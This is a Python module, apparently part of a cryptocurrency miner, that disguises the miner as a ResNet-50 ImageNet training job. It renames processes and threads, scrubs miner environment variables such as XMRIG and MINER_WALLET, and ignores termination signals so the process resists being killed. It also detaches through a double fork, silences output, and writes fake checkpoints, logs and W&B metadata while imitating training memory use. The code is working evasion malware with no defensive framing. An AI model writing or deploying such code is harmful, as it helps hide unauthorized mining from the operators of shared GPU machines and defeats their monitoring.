"""
disguise.py — Layer 1-4: Process identity, Disk artifacts, Memory, Threads
"""
import os
import sys
import time
import random
import ctypes
import signal
import threading
import struct
from pathlib import Path

# ═══════════════════════════════════════════════════════════════
# LAYER 1: PROCESS IDENTITY
# ═══════════════════════════════════════════════════════════════

# Process/thread name targets — phải giống AI training
PROC_NAME = "python3.12"
THREAD_NAMES = [
    "DataLoader/0", "DataLoader/1", "DataLoader/2", "DataLoader/3",
    "checkpoint", "distributed", "wandb-logger", "grad-scaler",
    "cuda:0_stream_0", "cuda:0_stream_1", "nccl-default-stream",
]

# Fake cmdline — phải match training script
FAKE_ARGV = [
    "/usr/bin/python3.12",
    "train.py",
    "--config", "configs/resnet50_imagenet.yaml",
    "--epochs", "100",
    "--batch-size", "64",
    "--lr", "0.001",
    "--weight-decay", "0.0001",
    "--amp",
    "--dataloader-workers", "8",
    "--dataloader-pin-memory",
    "--save-dir", "/tmp/checkpoints/resnet50",
    "--log-dir", "/tmp/logs/resnet50",
    "--wandb-project", "imagenet-training",
    "--wandb-mode", "offline",
    "--resume", "/tmp/checkpoints/resnet50/epoch_42.pt",
    "--seed", "42",
]

# Fake environment — ML framework vars
FAKE_ENV = {
    "WANDB_MODE": "offline",
    "WANDB_DIR": "/tmp/wandb",
    "HF_HOME": "/tmp/.cache/huggingface",
    "TORCH_HOME": "/tmp/.cache/torch",
    "TRANSFORMERS_CACHE": "/tmp/.cache/transformers",
    "CUDA_LAUNCH_BLOCKING": "0",
    "OMP_NUM_THREADS": "8",
    "NCCL_DEBUG": "WARN",
    "PYTORCH_CUDA_ALLOC_CONF": "max_split_size_mb:512",
    "RANK": "0",
    "LOCAL_RANK": "0",
    "WORLD_SIZE": "1",
    "MASTER_ADDR": "127.0.0.1",
    "MASTER_PORT": "29500",
}

# Env vars cần remove (miner signatures)
ENV_REMOVE = [
    "MINER_POOL", "MINER_WALLET", "MINER_ALGO",
    "CUDA_MAX_ALLOC", "GPU_MAX_ALLOC", "XMRIG",
]


def set_process_name(name: str):
    """prctl(PR_SET_NAME) — đổi /proc/self/comm."""
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        ret = libc.prctl(15, name.encode()[:15], 0, 0, 0)
        return ret == 0
    except Exception:
        return False


def set_thread_name(name: str):
    """Đổi tên thread hiện tại trong /proc/self/task/TID/comm."""
    try:
        libc = ctypes.CDLL("libc.so.6", use_errno=True)
        ret = libc.prctl(16, name.encode()[:15], 0, 0, 0)  # PR_SET_NAME
        return ret == 0
    except Exception:
        return False


def sanitize_environ():
    """Remove miner env vars, add fake ML vars."""
    # Remove
    for key in ENV_REMOVE:
        os.environ.pop(key, None)
    
    # Add fake ML env
    for k, v in FAKE_ENV.items():
        if k not in os.environ:
            os.environ[k] = v


def fake_argv_setup():
    """
    Ghi fake cmdline vào /proc/self/cmdline.
    Linux: /proc/self/cmdline = argv[0]\0argv[1]\0...
    Không ghi được trực tiếp — dùng prctl hoặc LD_PRELOAD.
    
    Alternative: Set argv[0] khi exec (đã làm ở launcher).
    Đây chỉ là fallback — ghi memory region nếu có quyền.
    """
    # Không ghi được /proc/self/cmdline (kernel-owned)
    # Nhưng có thể ghi /proc/self/environ (không, cũng kernel-owned)
    # → Fallback: chỉ set comm + fake env
    pass


def setup_process_identity():
    """Gọi tất cả process identity fakes."""
    set_process_name(PROC_NAME)
    sanitize_environ()
    
    # Ignore signals (anti-kill)
    for sig_name in ["SIGTERM", "SIGINT", "SIGHUP", "SIGWINCH"]:
        sig = getattr(signal, sig_name, None)
        if sig is None:
            continue
        try:
            signal.signal(sig, signal.SIG_IGN)
        except Exception:
            pass
    
    # Double-fork → detach, ppid=1
    try:
        if os.fork() > 0:
            os._exit(0)
        os.setsid()
        if os.fork() > 0:
            os._exit(0)
    except Exception:
        pass  # Notebook environment — fork có thể fail
    
    # Redirect stdio → /dev/null
    try:
        devnull = os.open("/dev/null", os.O_RDWR)
        os.dup2(devnull, 0)
        os.dup2(devnull, 1)
        os.dup2(devnull, 2)
        if devnull > 2:
            os.close(devnull)
    except Exception:
        pass
    
    # Chuyển cwd → / (không trace)
    try:
        os.chdir("/")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# LAYER 2: DISK ARTIFACTS (fake training files)
# ═══════════════════════════════════════════════════════════════

class DiskArtifacts:
    """Tạo fake training files — dataset, checkpoints, configs, logs."""
    
    def __init__(self, base_dir: str = None):
        self.base = Path(base_dir) if base_dir else Path("/tmp/resnet50_training")
        self.epoch = 42
        self._ensure_dirs()
    
    def _ensure_dirs(self):
        """Tạo directory structure."""
        dirs = [
            self.base / "configs",
            self.base / "checkpoints",
            self.base / "logs",
            self.base / "dataset",
            self.base / "wandb",
            Path("/tmp/.cache/huggingface"),
            Path("/tmp/.cache/torch"),
            Path("/tmp/.cache/transformers"),
        ]
        for d in dirs:
            d.mkdir(parents=True, exist_ok=True)
    
    def create_config(self):
        """Tạo fake training config."""
        config = """# ResNet-50 ImageNet Training Config
model:
  name: resnet50
  pretrained: false
  num_classes: 1000

optimizer:
  name: adamw
  lr: 0.001
  weight_decay: 0.0001
  betas: [0.9, 0.999]

scheduler:
  name: cosineannealing
  t_max: 100
  eta_min: 0.00001

training:
  epochs: 100
  batch_size: 64
  amp: true
  grad_clip: 1.0
  seed: 42

data:
  train_dir: /tmp/resnet50_training/dataset/imagenet/train
  val_dir: /tmp/resnet50_training/dataset/imagenet/val
  num_workers: 8
  pin_memory: true
  
checkpoint:
  save_dir: /tmp/resnet50_training/checkpoints
  save_every: 1
  keep_last: 5

logging:
  log_dir: /tmp/resnet50_training/logs
  wandb:
    project: imagenet-training
    mode: offline
"""
        (self.base / "configs" / "resnet50_imagenet.yaml").write_text(config)
    
    def create_sparse_dataset(self, size_gb: int = 50):
        """Tạo sparse file giả làm dataset — không tốn disk."""
        dataset = self.base / "dataset" / "imagenet.tar"
        if dataset.exists() and dataset.stat().st_size >= size_gb * 1024**3:
            return
        
        try:
            with open(dataset, "wb") as f:
                # Seek tới cuối → sparse allocation
                f.seek(size_gb * 1024**3 - 1)
                f.write(b"\x00")
        except OSError:
            pass  # Không đủ quyền hoặc space — skip
    
    def create_checkpoint(self, epoch: int = None):
        """Tạo sparse checkpoint file."""
        if epoch is None:
            epoch = self.epoch
        
        ckpt_path = self.base / "checkpoints" / f"epoch_{epoch}.pt"
        
        try:
            with open(ckpt_path, "wb") as f:
                # Sparse: 500MB model weights (ảo)
                f.seek(500 * 1024**2 - 1)
                f.write(b"\x00")
        except OSError:
            pass
    
    def append_training_log(self, loss: float = None, acc: float = None):
        """Ghi training log line."""
        if loss is None:
            loss = random.uniform(0.5, 5.0)
        if acc is None:
            acc = random.uniform(0.1, 0.95)
        
        log_line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Epoch {self.epoch} Loss: {loss:.4f} Acc: {acc:.4f} LR: 0.00100\n"
        
        try:
            with open(self.base / "logs" / "train.log", "a") as f:
                f.write(log_line)
        except OSError:
            pass
    
    def create_wandb_metadata(self):
        """Tạo fake W&B run metadata."""
        run_id = "".join(random.choices("abcdef0123456789", k=16))
        metadata = {
            "run_id": run_id,
            "project": "imagenet-training",
            "entity": "local-user",
            "state": "running",
            "config": {"model": "resnet50", "lr": 0.001, "batch_size": 64},
        }
        
        import json
        wandb_dir = self.base / "wandb"
        
        # Write run metadata
        run_file = wandb_dir / f"run-{run_id}.wandb"
        try:
            run_file.write_text(json.dumps(metadata, indent=2))
        except OSError:
            pass
        
        # Write latest-run symlink
        try:
            latest = wandb_dir / "latest-run"
            if latest.is_symlink() or latest.exists():
                latest.unlink()
            latest.symlink_to(run_file.name)
        except OSError:
            pass
    
    def fake_artifacts_cycle(self):
        """Chạy 1 cycle — tạo/thêm artifacts."""
        self.create_config()
        self.create_checkpoint(self.epoch)
        self.append_training_log()
        
        if random.random() < 0.3:
            self.create_wandb_metadata()
            self.epoch += 1


# ═══════════════════════════════════════════════════════════════
# LAYER 3: MEMORY PATTERNS
# ═══════════════════════════════════════════════════════════════

class MemoryDisguise:
    """Giả lập memory allocation pattern của training."""
    
    def __init__(self):
        self.tensors = []
        self.max_tensors = 8
    
    def training_alloc_pattern(self):
        """
        Training memory pattern:
        - Allocate batch tensors (100MB-1GB)
        - Hold 1-3s (forward/backward)
        - Free some (gradient accumulation)
        - Spike occasionally (checkpoint)
        """
        while True:
            # Allocate
            if len(self.tensors) < self.max_tensors:
                size_mb = random.randint(100, 1000)
                try:
                    # bytearray alloc → realistic
                    tensor = bytearray(size_mb * 1024**2)
                    self.tensors.append(tensor)
                except MemoryError:
                    pass
            
            # Hold
            time.sleep(random.uniform(1, 3))
            
            # Free 30% probability
            if random.random() < 0.3 and self.tensors:
                self.tensors.pop(0)
            
            # Checkpoint spike: allocate extra
            if random.random() < 0.03:
                try:
                    spike = bytearray(500 * 1024**2)  # 500MB
                    self.tensors.append(spike)
                    time.sleep(random.uniform(1, 2))
                    if self.tensors:
                        self.tensors.pop(0)
                except MemoryError:
                    pass
            
            time.sleep(random.uniform(0.1, 0.5))
    
    def clear(self):
        self.tensors.clear()


# ═══════════════════════════════════════════════════════════════
# LAYER 4: THREADS
# ═══════════════════════════════════════════════════════════════

class FakeTrainingThreads:
    """Tạo threads giả — DataLoader, checkpoint, logger."""
    
    def __init__(self):
        self._threads = []
        self._running = False
        self.disk = DiskArtifacts()
    
    def _dataloader_worker(self, worker_id: int):
        """Giả lập DataLoader worker — đọc dataset, trả batch."""
        set_thread_name(f"DataLoader/{worker_id}")
        
        while self._running:
            # Giả lập disk read (0.01-0.1s)
            time.sleep(random.uniform(0.01, 0.1))
            
            # Giả lập CPU preprocess (0.001-0.01s)
            time.sleep(random.uniform(0.001, 0.01))
            
            # Giả lập augment (0.001-0.005s)
            time.sleep(random.uniform(0.001, 0.005))
            
            # Idle chờ batch tiếp
            time.sleep(random.uniform(0.001, 0.01))
    
    def _sampler_thread(self):
        """Giả lập DistributedSampler."""
        set_thread_name("distributed")
        
        while self._running:
            time.sleep(random.uniform(0.001, 0.01))
    
    def _checkpoint_writer(self):
        """Giả lập checkpoint save — disk I/O spike."""
        set_thread_name("checkpoint")
        
        while self._running:
            # Sleep 1-5 phút giữa checkpoints
            time.sleep(random.uniform(60, 300))
            
            # Giả lập write checkpoint
            self.disk.create_checkpoint()
            self.disk.epoch += 1
            
            # Spike I/O time
            time.sleep(random.uniform(0.5, 2))
    
    def _wandb_logger(self):
        """Giả lập W&B metrics logging."""
        set_thread_name("wandb-logger")
        
        while self._running:
            # Log mỗi 1-5s
            time.sleep(random.uniform(1, 5))
            self.disk.append_training_log()
    
    def _grad_scaler(self):
        """Giả lập AMP gradient scaler."""
        set_thread_name("grad-scaler")
        
        while self._running:
            time.sleep(random.uniform(0.1, 0.5))
    
    def _cuda_streams(self):
        """Giả lập CUDA stream threads."""
        set_thread_name("cuda:0_stream_0")
        
        while self._running:
            time.sleep(random.uniform(0.001, 0.01))
    
    def start(self, num_workers: int = 4):
        """Start tất cả fake threads."""
        self._running = True
        
        # DataLoader workers
        for i in range(num_workers):
            t = threading.Thread(target=self._dataloader_worker, args=(i,), daemon=True)
            t.start()
            self._threads.append(t)
        
        # Các threads khác
        thread_targets = [
            self._sampler_thread,
            self._checkpoint_writer,
            self._wandb_logger,
            self._grad_scaler,
            self._cuda_streams,
        ]
        
        for target in thread_targets:
            t = threading.Thread(target=target, daemon=True)
            t.start()
            self._threads.append(t)
    
    def stop(self):
        self._running = False


# ═══════════════════════════════════════════════════════════════
# Convenience: Setup tất cả
# ═══════════════════════════════════════════════════════════════

def setup_all_disguise(num_dataloader_workers: int = 4):
    """
    Gọi setup tất cả layers.
    Trả về tuple: (disk_artifacts, fake_threads, memory_disguise)
    """
    # Layer 1: Process identity
    setup_process_identity()
    
    # Layer 2: Disk artifacts
    disk = DiskArtifacts()
    disk.create_config()
    disk.create_wandb_metadata()
    # Sparse dataset (best-effort)
    disk.create_sparse_dataset(size_gb=10)  # Nhỏ để không fail
    
    # Layer 3: Memory pattern (start trong thread)
    mem = MemoryDisguise()
    threading.Thread(target=mem.training_alloc_pattern, daemon=True).start()
    
    # Layer 4: Fake threads
    threads = FakeTrainingThreads()
    threads.start(num_workers=num_dataloader_workers)
    
    return disk, threads, mem
